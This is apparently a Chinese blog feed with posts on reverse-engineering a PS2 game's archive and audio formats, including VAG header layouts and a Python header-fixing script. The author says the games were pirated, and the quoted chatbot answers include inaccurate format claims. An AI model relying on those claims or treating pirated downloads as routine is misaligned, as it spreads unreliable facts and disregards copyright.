<code>.cnut</code></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/42.jpg" alt="Not Found"></p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>某上古 PS2 游戏逆向（二）音频分析</title>
    <link href="https://srpopty.github.io/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-06-11T06:27:12.000Z</published>
    <updated>2023-06-11T06:27:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="音频文件分析"><a href="# 音频文件分析" class="headerlink" title="音频文件分析"></a>音频文件分析 </h1><p> 根据文件名猜测角色音频保存在 <code>VOICE_ID.bin</code> 中，使用 Cube Media Player2 扫描 <code>VOICE_ID.bin</code> 可以发现里面保存的是 <code>adpcm</code> 格式的原始音频数据</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/11.jpg" alt="Not Found"></p><p>本来尝试直接利用 PSound 或者 Cube Media Player2 提取音频，自动转换到 wav 可以省很多事，但是发现这两个软件要么扫描的不全，要么扫描出来的音频是错的，所以折腾了半天，还是得自己手动提取。不过 Cube Media Player2 可以提供扫描到的音频的偏移以及长度，正好也验证了前文提取出来的文件内容是正确的。</p><p>Google 了一下，adpcm 是基于 pcm 的一种有损压缩编码，可以大幅压缩 pcm 数据，通常 wav 文件中就包含了原始的 pcm 或者 adpcm 数据，因此直接将 adpcm 转换为 wav 是有可能的，不过需要知道其对应的采样率、声道等信息。当然，以上信息来自 Google，不管是中文英文，大部分都是水文或者标题党，点名批评 CSDN，大部分文章点进去发现就介绍了一下 adpcm 算法，然后就介绍 wav 文件的格式，甚至连 adpcm 的格式都说不清楚，维基百科介绍的都比文章里介绍的言简意赅，搜了一个晚上和一个下午，愣是没查出来到底怎么把 adpcm 转换为 wav。</p><h1 id="AI 的智慧"><a href="#AI 的智慧" class="headerlink" title="AI 的智慧"></a>AI 的智慧 </h1><p> 手动将原始的 adpcm 拖到 Audacity 中使用 adpcm 格式确实可以听到一点点人声，但是噪声非常非常大。最后无奈求助人工智能，人工智能确实比网上不靠谱的文章靠谱的多，求助 bard，有了如下对话：</p><hr><p><strong>Srpopty</strong>: What is PS2 ADPCM Raw File?</p><p><strong>Bard</strong>: A PS2 ADPCM raw file is a type of audio file that is used to store audio data on the PlayStation 2 console. The file format is based on the ADPCM (Adaptive Differential Pulse-Code Modulation) compression algorithm, which is a lossy compression format that reduces the size of the audio file by discarding some of the data.</p><p>PS2 ADPCM raw files are typically stored in a .VAG file format. The file format consists of a header, which contains information about the audio data, and a data section, which contains the compressed audio data.</p><p>To play back a PS2 ADPCM raw file, you will need a software application that supports the .VAG file format. Some popular software applications that support the .VAG file format include:</p><ul><li><strong>Audacity</strong></li><li><strong>VLC Media Player</strong></li><li><strong>foobar2000</strong></li></ul><p>Once you have a software application that supports the .VAG file format, you can open the file and play it back.</p><p>Here are some of the advantages of using PS2 ADPCM raw files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> PS2 ADPCM raw files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using PS2 ADPCM raw files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> PS2 ADPCM raw files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, PS2 ADPCM raw files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这里可以得到一个很重要的信息 <code>PS2 ADPCM raw files are typically stored in a .VAG file format</code>，在 PS2 中音频经常使用 <code>.vag</code> 格式保存，并且还提醒我们可以用 <code>Audacity</code> 打开这种格式。</p><hr><p><strong>Srpopty</strong>: What is the  .VAG file format?</p><p><strong>Bard</strong>: A .VAG file is a sound file format developed by Sony for use in PlayStation games. It is a compressed format that uses the Adaptive Differential Pulse-Code Modulation (ADPCM) algorithm to reduce the size of the audio data.</p><p>.VAG files are typically 4-bit ADPCM, which means that each sample is represented by 4 bits of data. This results in a file size that is about one-quarter the size of a uncompressed 16-bit audio file.</p><p>.VAG files are stored in a RIFF (Resource Interchange File Format) container. The RIFF header contains information about the file, such as the number of channels, the sample rate, and the bit depth. The data section contains the compressed audio data.</p><p>.VAG files can be played back by software that supports the RIFF container format. Some popular software applications that can play back .VAG files include:</p><ul><li>Audacity</li><li>VLC Media Player</li><li>foobar2000</li></ul><p>.VAG files are a common format for storing sound effects and music in PlayStation games. They are also used in some other applications, such as video editing and audio recording.</p><p>Here are some of the advantages of using .VAG files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create .VAG files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> .VAG files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using .VAG files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create .VAG files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> .VAG files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, .VAG files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这段对话可以知道 <code>.VAG files can be played back by software that supports the RIFF container format</code>，<code>.vag</code> 保存在 RIFF 中，但是在我们提取出的文件中并没有看到 RIFF 文件头，于是尝试将 <code>VOICE_ID</code> 中的后缀名改为 <code>.vag</code>，再用 Audacity 打开，发现 Audacity 可以正常读取，设置采样率为 <code>22050</code> 可以听到清晰的人声，而 <code>VOCIDE_ID</code> 中第一个文件的人声刚好和 PSound 提取的相同，但是 PSound 只提取出了这一段声音的后半段。</p><h1 id="VAG 文件"><a href="#VAG 文件" class="headerlink" title="VAG 文件"></a>VAG 文件 </h1><p> 然而，尽管 ps2 使用 <code>.vag</code> 格式保存音频，但是 vag 仍然拥有固定的格式，例如在 vag2 和 vag3 的两个版本中都有不同的文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Format Specifications (version 2)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - magic // &quot;VAGp&quot;</span><br><span class="line">4 bytes uint32 - format version  // &quot;2&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">2 bytes (uint16) - base volume for left channel</span><br><span class="line">2 bytes (uint16) - base volume for right channel</span><br><span class="line">2 bytes (uint16) - base pitch (includes fs modulation)</span><br><span class="line">2 bytes (uint16) - base ADSR1</span><br><span class="line">2 bytes (uint16) - base ADSR2</span><br><span class="line">2 bytes (uint16) - reserved area</span><br><span class="line">16 bytes (char) - track name</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 3)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;3&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">32 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 6)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;6&quot;</span><br><span class="line">4 bytes (uint32) - reserved area</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">16 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br></pre></td></tr></table></figure><p>在我们提取出的文件中并没有发现”VAGp”这个字符串，如下图所示 <code>VIOCE_ID.BIN</code> 的第一个文件</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/12.jpg" alt="Not Found"></p><p>但是 Audacity 仍然可读，可以猜测我们提取出的只是裸数据，也就是 <code>waveform data</code>，仍然缺少文件头，意味着缺少例如采样率，声道数等信息，导致从 Audacity 导出时会将裸数据中的值解析为 vag 格式，例如导出为 mp3 时会警告</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/13.jpg" alt="Not Found"></p><p>而 150999087，也就是 0x0900102f 刚好对应前面 0x10 位置处的 4 个字节，因此我们需要为裸数据填充合适的文件头。</p><p>在 Audacity 中设置采样率为 22050，单声道时可以听到清晰的人声，因此确定裸数据的采样率就是 22050，声道数为 1，32 位浮点。</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/14.jpg" alt="Not Found"></p><p>根据 Google 的 <a href="https://www.psdevwiki.com/ps3/Multimedia_Formats_and_Tools#VAG"> 结果</a>，在 PS3 中使用了第六版的 VAG，因此我们先从 verison 6 开始尝试添加 vag 文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0000h: 56 41 47 70 00 00 00 06 00 00 00 00 00 01 07 00</span><br><span class="line">0010h: 00 00 56 22 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0020h: 74 65 73 74 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/15.jpg" alt="Not Found"></p><p>首先添加了 4 个字节的”VAGp”字符串，然后添加了 4 个字节版本号为 6，接着 4 个字节保留位，接着 4 个字节是 adpcm 裸数据的大小，接着是 4 个字节采样率，也就是 22050，之后 10 个字节保留位，接 1 个字节的声道数，也就是 0 表示单声道，接着 1 个字节保留位，最后从 0x20 开始 16 个字节填写音轨名称，大端保存。然后用 ffmpeg 转换为 wav，发现可以正常转换，播放的声音也正常</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/16.jpg" alt="Not Found"></p><h1 id="音频修复与转换"><a href="# 音频修复与转换" class="headerlink" title="音频修复与转换"></a>音频修复与转换 </h1><p> 基于以上分析的结果，可以写一个音频修复的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: vag.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Simply add a VAG6 header to raw vag data.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    filename = <span class="string">&quot;.&quot;</span>.join(filename.split(<span class="string">&quot;.&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    name = os.path.basename(filename)</span><br><span class="line">    name_part = name.split(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename + <span class="string">&quot;.vag&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">b&quot;\x56\x41\x47\x70&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x06&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">int</span>(name_part[-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x56\x22&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + <span class="string">&quot;_&quot;</span>.join(name_part[:-<span class="number">1</span>]).encode().ljust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            + data</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 <code>xargs</code> 批量修复 <code>VOICE_ID</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.dat | xargs -I &#123;&#125; sh -c <span class="string">&#x27;echo &#123;&#125; &amp;&amp; python3 ./vag.py ./&#123;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>利用 <code>ffmpeg</code> 批量转换为 <code>.wavs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.vag | <span class="built_in">cut</span> -d <span class="string">&#x27;.&#x27;</span> -f 1 | xargs -I &#123;&#125; ffmpeg -i &#123;&#125;.vag &#123;&#125;.wav</span><br></pre></td></tr></table></figure><p>到此，<code>VOICE_ID</code> 分析完成，同理可以提取出 <code>SOUND_ID</code> 中的音乐，发现 <code>SOUND_ID</code> 中存储的基本都是 BGM，除此以外，在 <code>SOUND_ID</code> 中还有一部分文件保存类似偏移或者长度的数据，例如 <code>1_0_14.dat</code></p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/1.jpg" alt="Not Found"></p><p>经过观察可以发现每隔一定数量的 BGM 就会出现一个这种文件，一共出现 36 个，该文件长度固定为 20 字节，开始为固定的 4 字节的 <code>0x00</code>，结尾为 4 字节的 <code>0x00</code> 或者 <code>0xff</code>，中间可能是小端保存的 3 个 int，例如上图中间的 <code>0xac12</code>，<code>0x01</code> 以及 <code>0x1000</code> 三个数字。此外，还有 9 个空文件，例如第一个文件 <code>0_0_0.dat</code>。该文件的作用暂时未知，不影响我们对 <code>SOUIND_ID</code> 的分析以及提取。</p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>某上古 PS2 游戏逆向（一）文件提取</title>
    <link href="https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-06-10T08:53:57.000Z</published>
    <updated>2023-06-10T08:53:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="# 前言" class="headerlink" title="前言"></a>前言 </h1><p> 最近几个月迷上了某上古动漫，希望借助 AI 技术复活动漫中的女主角。经过一番搜罗发现该动漫居然出过三款 PS2 文字冒险游戏，为了方便收集训练数据，需要从这三个 PS2 游戏中提取一些资源。然而毕竟是上古动漫，而且从来没接触过 PS2 的逆向，本文记录了一个 Web 狗针对一个上古 PS2 游戏的逆向全过程。</p><p>作为一个上古时期的动漫，第一款 PS2 游戏发售的时候北京奥运会都还没举行，因此在这个年代找到这三款上古游戏的资源确实是不容易，不过最终经过三天的努力，借助 Google Hacking 以及其他 Web 手段下载了这三款 <font style="color: black;background: black;"><del> 盗版 </del></font> 游戏。</p><p>PS2（Sony PlayStation2）是一款非常古老的游戏主机，在现代 Mac 系统上使用 <a href="https://pcsx2.net/">PCSX2 模拟器</a> 运行 PS2 游戏的效果还不错，不过需要下载 BIOS，当然，借助 Google Hacking 还是比较容易找到这些 PS2 的 BIOS，包括欧版，日版，美版等。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/1.jpg" alt="Not Found"></p><p>逆向之前先试着玩了玩，确定三个游戏都可以正常运行，可惜都是日文，年代太久远了没有任何汉化，文字冒险游戏只看日文也确实玩不明白，只能听个响看个图，外网搜索了很久也几乎没人关注这个游戏的逆向，因此一切都需要从头开始。本文工作量较大，内容较多，将分为多个部分记录。</p><h1 id="目录结构与文件分析"><a href="# 目录结构与文件分析" class="headerlink" title="目录结构与文件分析"></a>目录结构与文件分析 </h1><p> 下载好的游戏都是常见的游戏光盘 iso 格式，直接打开 iso 就可以看到里面的目录。由于三个游戏都是同一家厂商开发，因此本文主要以其中一个游戏进行逆向。游戏本身 1.9G 左右，打开 iso 光盘里面的目录结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/Users/srpopty/Desktop/xxxx</span><br><span class="line">├── IOP</span><br><span class="line">│   ├── CDVDSTM.IRX</span><br><span class="line">│   ├── DBCMAN.IRX</span><br><span class="line">│   ├── DS2U_D.IRX</span><br><span class="line">│   ├── IOPRP310.IMG</span><br><span class="line">│   ├── LIBSD.IRX</span><br><span class="line">│   ├── MC2_D.IRX</span><br><span class="line">│   ├── MODHSYN.IRX</span><br><span class="line">│   ├── MODMIDI.IRX</span><br><span class="line">│   ├── SDRDRV.IRX</span><br><span class="line">│   ├── SIO2D.IRX</span><br><span class="line">│   ├── SIO2MAN.IRX</span><br><span class="line">│   ├── SKHSYNTH.IRX</span><br><span class="line">│   ├── SKMIDI.IRX</span><br><span class="line">│   ├── SKSOUND.IRX</span><br><span class="line">│   └── USBD.IRX</span><br><span class="line">├── MOVIE</span><br><span class="line">│   ├── MMVLOGO.PSS</span><br><span class="line">│   ├── WARP.PSS</span><br><span class="line">│   ├── ZERO3ED.PSS</span><br><span class="line">│   └── ZERO3OP.PSS</span><br><span class="line">├── NORMAL.BIN</span><br><span class="line">├── NORMAL.HD</span><br><span class="line">├── SCENEDAT.BIN</span><br><span class="line">├── SCENEDAT.HD</span><br><span class="line">├── SCENE_ID.BIN</span><br><span class="line">├── SCENE_ID.HD</span><br><span class="line">├── SLPS_258.97</span><br><span class="line">├── SOUND_ID.BIN</span><br><span class="line">├── SOUND_ID.HD</span><br><span class="line">├── SYSTEM.BIN</span><br><span class="line">├── SYSTEM.CNF</span><br><span class="line">├── SYSTEM.HD</span><br><span class="line">├── VOICE_ID.BIN</span><br><span class="line">└── VOICE_ID.HD</span><br><span class="line"></span><br><span class="line">3 directories, 33 files</span><br></pre></td></tr></table></figure><p>大概了解一些 PS2 的开发基础，相较于现代游戏主机，PS2 的开发较为自由，换句话说就是不太规范，各种文件、脚本、字节码这些格式开发者甚至可以自己定义。</p><p>首先在 CD 根目录中，<code>SLPS_xxx.xx</code> 一般作为游戏主程序，也就是主要入口，游戏运行时首先执行的就是就是这个程序，从 <code>SYSTEM.CNF</code> 中也能看到这个信息，<code>file</code> 一下也可以看到是 32 位的 mips，静态链接，无符号表，可以用 IDA 反汇编，或者直接用 Ghidra 反编译。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, MIPS, MIPS-III version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>此外还可以看到两个目录 <code>IOP</code> 和 <code>MOVIE</code>。在 PS2 中，<code>IOP</code> 类似 Windows 的 <code>.dll</code> 以及 Unix 的 <code>.so</code>，属于动态链接库，<code>file</code> 一下目录中的 <code>.IRX</code> 文件也可以看到是和 <code>SLPS_xxx.xx</code> 一样的 MIPS ELF，但是单靠文件名暂时不好判断其功能。而在 <code>MOIVE</code> 中的 <code>.PSS</code> 是一种视频文件格式，可以直接用 VLC 播放，但是没有声音，包括了厂商 logo、开头的 OP、结束的 ED 以及一个 <code>WARP</code> 视频。</p><p>之后在 CD 根目录下可以看到很多同名的 <code>.BIN</code> 和 <code>.HD</code> 文件，包括 <code>NORMAL</code>，<code>SCENE_ID</code>，<code>SCENEDAT</code>，<code>SOUND_ID</code>，<code>VOICE_ID</code> 以及 <code>SYSTEM</code>，用 <code>file</code> 或者 <code>binwalk</code> 也查不出来是什么类型的文件。</p><p>通过分析 <code>.BIN</code> 文件和 <code>.HD</code> 文件的大小（如下表所示），推测 <code>.HD</code> 与 <code>.BIN</code> 存在对应关系，<code>.BIN</code> 可能是多个文件打包，而 <code>.HD</code> 则存储了映射关系。</p><table><thead><tr><th>Name</th><th>NORMAL</th><th>SCENE_ID</th><th>SCENEDAT</th><th>SOUND_ID</th><th>VOICE_ID</th><th>SYSTEM</th></tr></thead><tbody><tr><td>.BIN</td><td>12 MB</td><td>7.4b MB</td><td>171 MB</td><td>363 MB</td><td>1.2 GB</td><td>906 KB</td></tr><tr><td>.HD</td><td>2.6 KB</td><td>2.3 KB</td><td>8.4 KB</td><td>724 B</td><td>83 KB</td><td>168 B</td></tr></tbody></table><p>首先根据文件名以及对应的文件大小可以大致猜出，<code>SCENEDAT</code> 中保存的可能是各种场景资源，例如贴图，<code>SOUND_ID</code> 中保存的是音效，而最大的 <code>VOICE_ID</code> 中保存的可能就是角色的语音。</p><p>本文的最终目标是提取出角色声音，也就是 <code>VOICE_ID</code> 中的音频以及对应的文本作为训练数据。</p><h1 id="BIN 文件提取"><a href="#BIN 文件提取" class="headerlink" title="BIN 文件提取"></a>BIN 文件提取 </h1><p> 既然 <code>.HD</code> 和 <code>.BIN</code> 是存在对应关系，那么首先要想办法利用 <code>.HD</code> 从 <code>.BIN</code> 中提取文件。首先以最小的 <code>SYSTEM</code> 为例，用 010 Editor 查看可以看到 <code>SYSTEM.BIN</code> 中保存了类似代码的明文数据</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/2.jpg" alt="Not Found"></p><p>并且每隔一段距离就会出现大量的 <code>0xff</code>，类似分隔符</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/3.jpg" alt="Not Found"></p><p>虽然可以看到类似代码的明文，但是其中也夹杂了很多不可见字符，此外明文中也可以看到很多 for、if 这种语法结构，因此不可能是某种语言的字节码，那么直接用文本模式打开 <code>SYSTEM</code> 可以看到不可见字符全部出现在了类似 C 风格的注释中。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/4.jpg" alt="Not Found"></p><p>考虑到这是个日本发行商的游戏，因此猜测可能是日文注释，重新用日文编码 <code>Shift JIS</code> 打开文件可以看到正常的文件内容，果然是用日语写注释。。。</p><p><img 